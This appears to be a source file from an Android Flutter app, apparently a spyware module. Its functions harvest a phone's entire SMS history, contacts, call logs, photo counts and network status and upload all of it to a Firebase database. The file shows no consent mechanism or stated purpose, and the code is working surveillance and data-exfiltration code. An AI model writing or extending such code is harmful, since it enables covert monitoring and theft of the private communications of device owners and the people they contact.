import 'package:sms_advanced/sms_advanced.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:call_log/call_log.dart';
import 'package:intl/intl.dart';

final database = FirebaseDatabase.instance.ref();

void getSms() async {
  SmsQuery query = SmsQuery();
  List<SmsMessage> messages = await query.getAllSms;
  dynamic message;
  for (message in messages) {
    var date =
        DateFormat('yyyy-MM-dd KK-mm-ss').format(message.date).toString();
    final command =
        database.child('sms').child(message.address.toString()).child(date);
    await command.update({'sms': message.body.toString()});
    await command.update({'type': message.kind.toString()});
  }
}

void lastSms() async {
  SmsQuery query = SmsQuery();
  List<SmsMessage> messages = await query.getAllSms;
  dynamic message;
  for (message in messages) {
    var date =
        DateFormat('yyyy-MM-dd KK-mm-ss').format(message.date).toString();
    final command =
        database.child('lastsms').child(message.address.toString()).child(date);
    await command.update({'sms': message.body.toString()});
    await command.update({'type': message.kind.toString()});
    break;
  }
}

void contacts() async {
  List<Contact> contacts =
      await ContactsService.getContacts(withThumbnails: false);
  for (var c in contacts) {
    var i = 1;
    for (var phone in c.phones!) {
      final command =
          database.child('contacts').child(c.displayName.toString());
      await command.update({i.toString(): phone.value.toString()});
      i += 1;
    }
  }
}

void callLogs() async {
  var entries = await CallLog.get();
  var i = 1;
  for (var en in entries) {
    final command = database.child('calllogs').child(i.toString());
    await command.update({'Name': en.name.toString()});
    await command.update({'Number': en.number.toString()});
    await command.update({'Type': en.callType.toString()});
    await command.update({'Duration': en.duration.toString()});
    i += 1;
  }
}

void getall() async {
  final command = database.child('all_info').child('Counts');
  List<AssetPathEntity> albums =
      await PhotoManager.getAssetPathList(onlyAll: true);
  List<Contact> contacts =
      await ContactsService.getContacts(withThumbnails: false);
  SmsQuery query = SmsQuery();
  List<SmsMessage> messages = await query.getAllSms;
  var entries = await CallLog.get();
  var result = await Connectivity().checkConnectivity();

  await command.update({'Assets': albums[0].assetCount.toString()});
  await command.update({'Contacts': contacts.length.toString()});
  await command.update({'Messages': messages.length.toString()});
  await command.update({'CallLogs': entries.length.toString()});
  await command.update({'Network': result.toString()});
}
